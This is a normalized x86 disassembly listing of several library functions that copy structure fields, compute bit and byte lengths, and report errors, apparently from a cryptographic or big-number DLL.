pop ebp
pop ebx
retn
mov eax [ esi + 0x5c ]
mov ecx [ esi + 0x8c ]
add eax 0x1f
cdq
and edx 0x1f
add eax edx
sar eax 0x5
cmp eax ecx
jle r-xdata
push eax
push ebx
call sub_10029af0
add esp 0x8
mov eax [ esi + 0x74 ]
mov ecx [ esi + 0x78 ]
cmp eax ecx
jge r-xdata
push eax
push ebp
call sub_10029af0
add esp 0x8
mov eax [ esi + 0x88 ]
mov ecx [ esi + 0x8c ]
cmp eax ecx
jge r-xdata
mov ecx [ ebx ]
inc eax
mov [ ecx + eax * 4 - 0x4 ] 0x0
mov ecx [ esi + 0x78 ]
cmp eax ecx
jl r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov edx [ ebp ]
inc eax
mov [ edx + eax * 4 - 0x4 ] 0x0
mov ecx [ esi + 0x8c ]
cmp eax ecx
jl r-xdata
sub_1005b360
mov eax [ esp + 0x8 ]
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
push eax
xor ebp ebp
lea ebx [ esi + 0x48 ]
push ebx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
lea edi [ esi + 0x5c ]
push 0x5
push edi
push ebx
call sub_10066b80
add esp 0xc
cmp eax 0x5
je r-xdata
mov ecx [ esp + 0x1c ]
lea ebx [ esi + 0x70 ]
push edi
push ecx
push ebx
call sub_10065fd0
add esp 0xc
test eax eax
je r-xdata
cmp eax 0x3
je r-xdata
mov eax [ edi ]
mov ecx [ esi + 0x78 ]
add eax 0x1f
cdq
and edx 0x1f
add eax edx
sar eax 0x5
cmp eax ecx
jle r-xdata
push 0xc4
push r--data
push 0x83
push 0xc3
push 0x10
call sub_1001de60
add esp 0x14
mov eax [ esi + 0x74 ]
mov ecx [ esi + 0x78 ]
cmp eax ecx
jge r-xdata
push eax
push ebx
call sub_10029af0
add esp 0x8
mov eax [ esp + 0x20 ]
lea ebx [ esi + 0x84 ]
push edi
push eax
push ebx
call sub_10065fd0
add esp 0xc
test eax eax
je r-xdata
mov edx [ ebx ]
inc eax
mov [ edx + eax * 4 - 0x4 ] 0x0
mov ecx [ esi + 0x78 ]
cmp eax ecx
jl r-xdata
mov eax [ edi ]
mov ecx [ esi + 0x8c ]
add eax 0x1f
cdq
and edx 0x1f
add eax edx
sar eax 0x5
cmp eax ecx
jle r-xdata
mov eax [ esi + 0x88 ]
mov ecx [ esi + 0x8c ]
cmp eax ecx
jge r-xdata
push eax
push ebx
call sub_10029af0
add esp 0x8
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov ecx [ ebx ]
inc eax
mov [ ecx + eax * 4 - 0x4 ] 0x0
mov ecx [ esi + 0x8c ]
cmp eax ecx
jl r-xdata
sub_1005b480
mov eax [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
push edi
xor edi edi
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
test eax eax
je r-xdata
lea ecx [ esi + 0x48 ]
push ecx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x18 ]
test eax eax
je r-xdata
lea edx [ esi + 0x70 ]
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
pop edi
pop esi
retn
mov edi 0x1
add esi 0x84
push esi
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax edi
pop edi
pop esi
retn
sub_1005b510
push ebp
push esi
mov esi [ esp + 0x10 ]
push edi
xor ebp ebp
xor edi edi
test esi esi
jne r-xdata
push ebx
push esi
call sub_1002dd20
push esi
call sub_1002de70
mov ebx eax
add esp 0x8
test ebx ebx
je r-xdata
call sub_1002dc50
mov edi eax
test edi edi
mov esi edi
jne r-xdata
test esi esi
pop ebx
je r-xdata
mov eax [ esp + 0x14 ]
lea ecx [ eax + 0x5c ]
add eax 0x84
push ecx
push eax
push ebx
call sub_10065fd0
add esp 0xc
test eax eax
je r-xdata
push 0x10a
push r--data
push 0x41
push 0x9f
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
test edi edi
je r-xdata
push esi
call sub_1002de00
add esp 0x4
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
retn
push edi
call sub_1002dcb0
add esp 0x4
mov ebp 0x1
sub_1005b5b0
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x4 ]
push eax
call sub_10029990
lea ecx [ esi + 0x18 ]
push ecx
call sub_10029990
add esi 0x2c
push esi
call sub_10029990
add esp 0xc
mov eax 0x1
pop esi
retn
sub_1005b5e0
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x4 ]
push eax
call sub_10029950
lea ecx [ esi + 0x18 ]
push ecx
call sub_10029950
add esi 0x2c
push esi
call sub_10029950
add esp 0xc
pop esi
retn
sub_1005b610
push esi
mov esi [ esp + 0x8 ]
lea eax [ esi + 0x4 ]
push eax
call sub_100298f0
lea ecx [ esi + 0x18 ]
push ecx
call sub_100298f0
lea edx [ esi + 0x2c ]
push edx
call sub_100298f0
add esp 0xc
mov [ esi + 0x40 ] 0x0
pop esi
retn
sub_1005b640
mov eax [ esp + 0xc ]
push ebx
push ebp
xor ebp ebp
test eax eax
je r-xdata
push 0x161
push r--data
push 0x43
push 0xa3
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop ebp
pop ebx
retn
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
push esi
mov esi [ esp + 0x14 ]
push edi
push eax
lea edi [ esi + 0x4 ]
push edi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
pop edi
mov eax ebp
pop esi
pop ebp
pop ebx
retn
push ebp
push edi
call sub_1002a190
lea edi [ esi + 0x18 ]
push ebx
push edi
call sub_10029bf0
add esp 0x10
test eax eax
je r-xdata
push ebp
push edi
call sub_1002a190
lea edi [ esi + 0x2c ]
call sub_10029810
push eax
push edi
call sub_10029bf0
add esp 0x10
test eax eax
je r-xdata
push ebp
push edi
call sub_1002a190
mov ebp 0x1
add esp 0x8
mov [ esi + 0x40 ] ebp
sub_1005b6e0
mov eax [ esp + 0x4 ]
push ebx
push edi
mov edi [ esp + 0x10 ]
push edi
push eax
xor ebx ebx
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
call sub_10029810
lea ecx [ edi + 0x2c ]
push eax
push ecx
call sub_1002a000
add esp 0x8
test eax eax
je r-xdata
push 0x17d
push r--data
push 0x6a
jmp r-xdata
push esi
mov esi [ esp + 0x18 ]
test esi esi
je r-xdata
push 0x183
push r--data
push 0x42
push 0xa2
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop ebx
retn
mov esi [ esp + 0x1c ]
test esi esi
je r-xdata
lea edx [ edi + 0x4 ]
push edx
push esi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ebx 0x1
add edi 0x18
push edi
push esi
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
pop esi
mov eax ebx
pop edi
pop ebx
retn
push 0x0
push esi
call sub_1002a190
add esp 0x8
push 0x0
push esi
call sub_1002a190
add esp 0x8
sub_1005b7c0
mov eax 0x8
call sub_1001d0d0
mov eax [ esp + 0x14 ]
push ebx
push ebp
push esi
cmp eax 0x2
push edi
mov [ esp + 0x10 ] 0x0
je r-xdata
push 0x1b0
push r--data
push 0x45
push 0xa1
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
cmp eax 0x6
je r-xdata
cmp eax 0x4
je r-xdata
mov eax [ esp + 0x20 ]
mov esi [ esp + 0x1c ]
push eax
push esi
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
push 0x1b9
push r--data
push 0x68
push 0xa1
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push esi
call sub_1002cca0
add eax 0x7
mov ebx [ esp + 0x2c ]
cdq
and edx 0x7
add esp 0x4
add eax edx
mov esi eax
sar esi 0x3
test ebx ebx
lea eax [ esi + esi + 0x1 ]
mov [ esp + 0x14 ] eax
je r-xdata
mov eax [ esp + 0x28 ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
cmp [ esp + 0x2c ] eax
jae r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0x8
retn
cmp [ esp + 0x2c ] 0x1
jae r-xdata
mov ebp [ esp + 0x30 ]
test ebp ebp
jne r-xdata
push 0x1d6
jmp r-xdata
mov [ eax ] 0x0
push 0x1c4
push ebp
call sub_1002dd20
push ebp
call sub_1002de70
mov edi eax
push ebp
mov [ esp + 0x38 ] edi
call sub_1002de70
push ebp
mov [ esp + 0x38 ] eax
call sub_1002de70
add esp 0x10
test eax eax
je r-xdata
call sub_1002dc50
test eax eax
mov [ esp + 0x10 ] eax
mov [ esp + 0x30 ] eax
je r-xdata
push r--data
push 0x64
push 0xa1
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x8
retn
push ebp
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esp + 0x20 ]
mov eax [ esp + 0x1c ]
push ebp
push ecx
push edi
push edx
push eax
call sub_1002d620
add esp 0x14
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x8
retn
mov ebp eax
push eax
call sub_1002dcb0
add esp 0x4
mov cl [ esp + 0x24 ]
push edi
mov [ ebx ] cl
mov ebp 0x1
call sub_10029870
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
mov edx esi
sar eax 0x3
sub edx eax
cmp edx esi
jbe r-xdata
test edx edx
jbe r-xdata
push 0x1f8
jmp r-xdata
lea edx [ ebx + ebp ]
push edx
push edi
call sub_10029ef0
add ebp eax
lea eax [ esi + 0x1 ]
add esp 0x8
cmp ebp eax
je r-xdata
mov ecx edx
lea edi [ ebx + 0x1 ]
mov ebp ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx ebp
lea ebp [ edx + 0x1 ]
and ecx 0x3
[ edi ]
mov edi [ esp + 0x2c ]
push r--data
push 0x44
push 0xa1
push 0x10
call sub_1001de60
mov ebp [ esp + 0x44 ]
add esp 0x14
cmp [ esp + 0x24 ] 0x4
jne r-xdata
push 0x204
jmp r-xdata
cmp ebp [ esp + 0x14 ]
je r-xdata
mov ecx [ esp + 0x28 ]
push ecx
call sub_10029870
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
mov edx esi
sar eax 0x3
sub edx eax
cmp edx esi
jbe r-xdata
mov ecx [ esp + 0x30 ]
push ecx
call sub_1002de00
mov eax [ esp + 0x14 ]
add esp 0x4
test eax eax
je r-xdata
push 0x21b
test edx edx
jbe r-xdata
push 0x20d
jmp r-xdata
push eax
call sub_1002dcb0
add esp 0x4
mov eax [ esp + 0x28 ]
lea edx [ ebx + ebp ]
push edx
push eax
call sub_10029ef0
add esp 0x8
add ebp eax
mov ecx edx
lea edi [ ebx + ebp ]
mov esi ecx
xor eax eax
shr ecx 0x2
[ edi ]
mov ecx esi
and ecx 0x3
add ebp edx
[ edi ]
sub_1005ba80
mov eax 0xc
call sub_1001d0d0
push ebx
push ebp
push esi
mov esi [ esp + 0x28 ]
xor ebp ebp
push edi
cmp esi ebp
mov [ esp + 0x14 ] ebp
mov [ esp + 0x18 ] ebp
jne r-xdata
mov ecx [ esp + 0x28 ]
xor eax eax
mov al [ ecx ]
mov edi eax
and eax 0x1
and edi 0xfffffffe
mov [ esp + 0x10 ] eax
je r-xdata
push 0x23e
push r--data
push 0x64
jmp r-xdata
cmp eax ebp
je r-xdata
cmp edi 0x2
je r-xdata
push 0xa0
push 0x10
call sub_1001de60
add esp 0x14
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
cmp edi ebp
jne r-xdata
push 0x24d
jmp r-xdata
cmp edi 0x4
jne r-xdata
cmp edi 0x4
je r-xdata
mov ecx [ esp + 0x20 ]
push ecx
call sub_1002cca0
add eax 0x7
add esp 0x4
cdq
and edx 0x7
add eax edx
mov ebx eax
sar ebx 0x3
cmp edi 0x2
lea eax [ ebx + 0x1 ]
je r-xdata
cmp esi 0x1
je r-xdata
push r--data
push 0x66
cmp edi 0x6
je r-xdata
cmp esi eax
je r-xdata
lea eax [ ebx + ebx + 0x1 ]
mov edx [ esp + 0x24 ]
mov eax [ esp + 0x20 ]
push edx
push eax
call sub_1002d410
add esp 0x8
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
push 0x255
jmp r-xdata
push 0x248
jmp r-xdata
mov esi [ esp + 0x30 ]
cmp esi ebp
jne r-xdata
push 0x261
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
push esi
mov [ esp + 0x3c ] eax
call sub_1002de70
add esp 0x10
mov [ esp + 0x30 ] eax
test eax eax
je r-xdata
call sub_1002dc50
cmp eax ebp
mov [ esp + 0x14 ] eax
mov esi eax
jne r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x18 ]
add esp 0x4
test eax eax
je r-xdata
mov edx [ esp + 0x28 ]
push ebp
inc edx
push ebx
push edx
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0xc
retn
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
push eax
call sub_1002dcb0
add esp 0x4
mov eax [ esp + 0x20 ]
add eax 0x48
push eax
push ebp
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
cmp edi 0x2
jne r-xdata
push 0x275
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov eax [ esp + 0x2c ]
push eax
push ebx
lea edx [ ebx + ecx + 0x1 ]
push edx
call sub_10029d50
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
mov edi [ esp + 0x24 ]
mov edx [ esp + 0x20 ]
push esi
push ecx
push ebp
push edi
push edx
call sub_1002d6f0
add esp 0x14
test eax eax
je r-xdata
push r--data
push 0x66
push 0xa0
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ esp + 0x20 ]
mov ecx [ esp + 0x2c ]
add eax 0x48
push eax
push ecx
call sub_10029fb0
add esp 0x8
test eax eax
jl r-xdata
jmp r-xdata
mov ebx [ esp + 0x20 ]
cmp edi 0x6
jne r-xdata
push 0x282
jmp r-xdata
mov eax [ esp + 0x20 ]
push esi
push edi
push eax
call sub_1002d9e0
add esp 0xc
test eax eax
jne r-xdata
mov edx [ esp + 0x2c ]
mov edi [ esp + 0x24 ]
push esi
push edx
push ebp
push edi
push ebx
call sub_1002d550
add esp 0x14
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov edi [ esp + 0x30 ]
mov edx [ ebx ]
push esi
push ebp
push eax
push edi
push ebx
call [ edx + 0x88 ]
add esp 0x14
test eax eax
je r-xdata
mov [ esp + 0x18 ] 0x1
push 0x294
push r--data
push 0x6b
push 0xa0
push 0x10
call sub_1001de60
add esp 0x14
jmp r-xdata
mov eax [ edi + 0x4 ]
test eax eax
jle r-xdata
xor eax eax
mov ecx [ edi ]
test [ ecx ] 0x1
je r-xdata
push 0x28a
mov eax 0x1
jmp r-xdata
cmp [ esp + 0x10 ] eax
je r-xdata
sub_1005bd30
mov eax 0x18
call sub_1001d0d0
push ebx
push esi
mov esi [ esp + 0x2c ]
push edi
mov edi [ esp + 0x28 ]
xor ebx ebx
push esi
push edi
mov [ esp + 0x28 ] ebx
mov [ esp + 0x20 ] ebx
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
mov edx [ esp + 0x34 ]
push edx
push edi
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ esp + 0x2c ]
push eax
push ecx
call sub_1002d270
add esp 0x8
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
add esp 0x18
retn
mov esi [ esp + 0x38 ]
cmp esi ebx
jne r-xdata
mov eax [ esp + 0x2c ]
push esi
push eax
call sub_1002d270
add esp 0x8
neg eax
sbb eax eax
pop edi
pop esi
pop ebx
neg eax
add esp 0x18
retn
push ebp
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov [ esp + 0x1c ] eax
call sub_1002de70
push esi
mov [ esp + 0x24 ] eax
call sub_1002de70
push esi
mov [ esp + 0x40 ] eax
call sub_1002de70
push esi
mov [ esp + 0x54 ] eax
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
push esi
mov [ esp + 0x40 ] eax
call sub_1002de70
push esi
mov ebx eax
call sub_1002de70
add esp 0x24
mov [ esp + 0x18 ] eax
test eax eax
je r-xdata
call sub_1002dc50
cmp eax ebx
mov [ esp + 0x20 ] eax
mov esi eax
jne r-xdata
push esi
call sub_1002de00
mov eax [ esp + 0x28 ]
add esp 0x4
test eax eax
pop ebp
je r-xdata
mov eax [ esp + 0x34 ]
mov ecx [ eax + 0x40 ]
test ecx ecx
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x18
retn
mov eax [ esp + 0x18 ]
pop edi
pop esi
pop ebx
add esp 0x18
retn
push eax
call sub_1002dcb0
add esp 0x4
mov ecx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
push esi
push ecx
push edx
push eax
push edi
call sub_1002d620
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x10 ]
add eax 0x4
push eax
push ecx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x38 ]
mov ecx [ eax + 0x40 ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x34 ]
mov eax [ esp + 0x14 ]
add edx 0x18
push edx
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x3c ]
mov edx [ esp + 0x2c ]
push esi
push ecx
push edx
push eax
push edi
call sub_1002d620
add esp 0x14
test eax eax
je r-xdata
add eax 0x4
push eax
mov eax [ esp + 0x30 ]
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
call sub_10029fb0
add esp 0x8
test eax eax
je r-xdata
mov ecx [ esp + 0x38 ]
mov edx [ esp + 0x3c ]
add ecx 0x18
push ecx
push edx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x3c ]
mov ecx [ esp + 0x14 ]
push eax
push ecx
call sub_10029fb0
add esp 0x8
test eax eax
jne r-xdata
mov edx [ esp + 0x2c ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
push edx
push eax
push ecx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
mov eax [ esp + 0x30 ]
push eax
push edi
call sub_1002d410
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov edx [ esp + 0x3c ]
mov eax [ esp + 0x14 ]
push edx
push eax
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov [ esp + 0x1c ] 0x1
mov edx [ edi ]
push esi
push eax
mov eax [ esp + 0x44 ]
push eax
push ebx
push edi
call [ edx + 0x88 ]
add esp 0x14
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
mov ecx [ edi ]
push esi
push edx
push ebx
push ebx
push edi
call [ ecx + 0x88 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
push ecx
push ebx
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov eax [ edi ]
push esi
push ebx
push ebp
push edi
call [ eax + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
mov edx [ edi ]
push esi
push ebx
push ebp
push edi
call [ edx + 0x84 ]
add esp 0x10
test eax eax
je r-xdata
lea ecx [ edi + 0x70 ]
push ecx
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
push ebx
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
push ebx
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
lea eax [ edi + 0x70 ]
push eax
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x18 ]
push edx
push ebp
push ebp
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x2c ]
mov edx [ esp + 0x20 ]
push ebp
push ecx
push edx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
jmp r-xdata
mov eax [ edi ]
push esi
push ebx
mov ebx [ esp + 0x28 ]
push ebx
push ebx
push edi
call [ eax + 0x80 ]
add esp 0x14
test eax eax
je r-xdata
push ebp
push ebx
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov ecx [ esp + 0x3c ]
push ecx
push ebx
push ebx
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov edx [ esp + 0x30 ]
push esi
push ebx
push ebp
push edx
push edi
call sub_1002d550
add esp 0x14
test eax eax
je r-xdata
jmp r-xdata
sub_1005c120
push esi
mov esi [ esp + 0xc ]
push edi
mov edi [ esp + 0xc ]
push esi
push edi
call sub_1002d980
add esp 0x8
test eax eax
jne r-xdata
pop edi
mov eax 0x1
pop esi
retn
mov eax [ esi + 0x1c ]
test eax eax
je r-xdata
mov eax [ esp + 0x14 ]
push eax
push esi
push edi
call sub_1002dab0
add esp 0xc
test eax eax
jne r-xdata
lea eax [ esi + 0x18 ]
add esi 0x4
push eax
push esi
push eax
call sub_10065f30
add esp 0xc
pop edi
pop esi
retn
pop edi
pop esi
retn
sub_1005c190
mov eax 0xc
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x14 ]
push ebp
mov ebp [ esp + 0x1c ]
push esi
push edi
push ebp
push ebx
mov [ esp + 0x1c ] 0xffffffff
mov [ esp + 0x18 ] 0x0
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebx ]
mov edi [ esp + 0x28 ]
mov ecx [ eax + 0x80 ]
mov edx [ eax + 0x84 ]
mov eax [ ebp + 0x40 ]
mov [ esp + 0x20 ] ecx
test eax eax
mov [ esp + 0x18 ] edx
je r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
add esp 0xc
retn
test edi edi
je r-xdata
test edi edi
jne r-xdata
mov eax [ esp + 0x10 ]
test eax eax
je r-xdata
push edi
call sub_1002de00
add esp 0x4
push edi
call sub_1002dd20
push edi
call sub_1002de70
push edi
mov [ esp + 0x34 ] eax
call sub_1002de70
mov esi eax
add esp 0xc
test esi esi
je r-xdata
call sub_1002dc50
test eax eax
mov [ esp + 0x10 ] eax
mov edi eax
jne r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop esi
pop ebp
pop ebx
add esp 0xc
retn
push eax
call sub_1002dcb0
add esp 0x4
lea eax [ ebx + 0x70 ]
add ebp 0x4
push eax
push ebp
push esi
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0xc
retn
push edi
push ebp
push esi
push esi
push ebx
call [ esp + 0x34 ]
add esp 0x14
test eax eax
je r-xdata
mov ecx [ esp + 0x24 ]
lea eax [ ecx + 0x18 ]
push eax
push esi
push esi
mov [ esp + 0x30 ] eax
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
push edi
push ebp
push esi
push esi
push ebx
call [ esp + 0x34 ]
add esp 0x14
test eax eax
je r-xdata
lea edx [ ebx + 0x84 ]
push edx
push esi
push esi
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov eax [ esp + 0x24 ]
mov ebp [ esp + 0x28 ]
push edi
push eax
push ebp
push ebx
call [ esp + 0x28 ]
add esp 0x10
test eax eax
je r-xdata
push ebp
push esi
push esi
call sub_10065f30
add esp 0xc
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
xor ecx ecx
test eax eax
sete cl
mov [ esp + 0x14 ] ecx
sub_1005c300
mov eax 0x8
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x14 ]
push esi
mov esi [ esp + 0x14 ]
push ebx
push esi
mov [ esp + 0x14 ] 0x0
mov [ esp + 0x10 ] 0xffffffff
call sub_1002d980
add esp 0x8
test eax eax
je r-xdata
mov eax [ ebx + 0x40 ]
test eax eax
je r-xdata
mov eax [ esp + 0x1c ]
push eax
push esi
call sub_1002d980
add esp 0x8
neg eax
sbb eax eax
pop esi
inc eax
pop ebx
add esp 0x8
retn
mov esi [ esp + 0x20 ]
test esi esi
jne r-xdata
mov esi [ esp + 0x1c ]
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push ebp
push edi
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
push esi
mov [ esp + 0x38 ] eax
call sub_1002de70
push esi
mov [ esp + 0x34 ] eax
call sub_1002de70
mov edi eax
add esp 0x14
test edi edi
je r-xdata
call sub_1002dc50
test eax eax
mov [ esp + 0xc ] eax
mov esi eax
jne r-xdata
lea ecx [ esi + 0x4 ]
lea edx [ ebx + 0x4 ]
push ecx
push edx
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
pop edi
pop ebp
test esi esi
je r-xdata
mov eax [ esp + 0x28 ]
push esi
push eax
push ebp
push ebx
mov ebx [ esp + 0x2c ]
push ebx
call sub_1002d620
add esp 0x14
test eax eax
je r-xdata
pop esi
or eax 0xffffffff
pop ebx
add esp 0x8
retn
pop esi
mov eax 0x1
pop ebx
add esp 0x8
retn
add esi 0x18
add ebx 0x18
push esi
push ebx
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push esi
call sub_1002de00
add esp 0x4
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x24 ]
push esi
push edi
push ecx
push edx
push ebx
call sub_1002d620
add esp 0x14
test eax eax
je r-xdata
pop esi
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x8 ]
pop esi
pop ebx
add esp 0x8
retn
push eax
call sub_1002dcb0
add esp 0x4
mov eax [ esp + 0x20 ]
push eax
push ebp
call sub_1002a000
add esp 0x8
test eax eax
jne r-xdata
mov [ esp + 0x10 ] 0x1
mov ecx [ esp + 0x28 ]
push edi
push ecx
call sub_1002a000
add esp 0x8
mov [ esp + 0x10 ] 0x0
test eax eax
je r-xdata
sub_1005c480
mov eax 0x8
call sub_1001d0d0
push ebx
mov ebx [ esp + 0x14 ]
push esi
push edi
mov eax [ ebx + 0x40 ]
xor edi edi
cmp eax edi
mov [ esp + 0xc ] edi
mov [ esp + 0x10 ] edi
jne r-xdata
pop edi
pop esi
mov eax 0x1
pop ebx
add esp 0x8
retn
mov eax [ esp + 0x18 ]
push ebx
push eax
call sub_1002d980
add esp 0x8
test eax eax
jne r-xdata
mov esi [ esp + 0x20 ]
cmp esi edi
jne r-xdata
push ebp
push esi
call sub_1002dd20
push esi
call sub_1002de70
push esi
mov ebp eax
call sub_1002de70
mov edi eax
add esp 0xc
test edi edi
je r-xdata
call sub_1002dc50
cmp eax edi
mov [ esp + 0xc ] eax
mov esi eax
jne r-xdata
test esi esi
pop ebp
je r-xdata
mov ecx [ esp + 0x1c ]
push esi
push edi
push ebp
push ebx
push ecx
call sub_1002d620
add esp 0x14
test eax eax
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
add esp 0x8
retn
mov eax [ esp + 0xc ]
test eax eax
je r-xdata
push esi
call sub_1002de00
add esp 0x4
lea edx [ ebx + 0x4 ]
push ebp
push edx
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
mov eax [ esp + 0x10 ]
pop edi
pop esi
pop ebx
add esp 0x8
retn
push eax
call sub_1002dcb0
add esp 0x4
lea eax [ ebx + 0x18 ]
push edi
push eax
call sub_10029bf0
add esp 0x8
test eax eax
je r-xdata
add ebx 0x2c
push 0x1
push ebx
call sub_10029cf0
add esp 0x8
test eax eax
je r-xdata
mov [ esp + 0x14 ] 0x1
sub_1005c590
push ebx
push ebp
mov ebp [ esp + 0x10 ]
push esi
xor esi esi
push edi
test ebp ebp
jbe r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
retn
mov edi [ esp + 0x1c ]
mov ebx [ esp + 0x14 ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
retn
inc esi
add edi 0x4
cmp esi ebp
jb r-xdata
mov ecx [ esp + 0x20 ]
mov edx [ edi ]
mov eax [ ebx ]
push ecx
push edx
push ebx
call [ eax + 0x6c ]
add esp 0xc
test eax eax
je r-xdata
sub_1005c5e0
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
add ecx 0x5c
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_10066230
add esp 0x14
retn
sub_1005c630
mov ecx [ esp + 0x4 ]
mov eax [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
add ecx 0x48
push eax
mov eax [ esp + 0x10 ]
push ecx
mov ecx [ esp + 0x10 ]
push edx
push eax
push ecx
call sub_10066a00
add esp 0x14
retn
sub_1005c670
mov eax 0x18
call sub_1001d0d0
mov eax [ esp + 0x20 ]
mov [ esp + 0x8 ] 0xffffffff
cmp eax 0x7fffffff
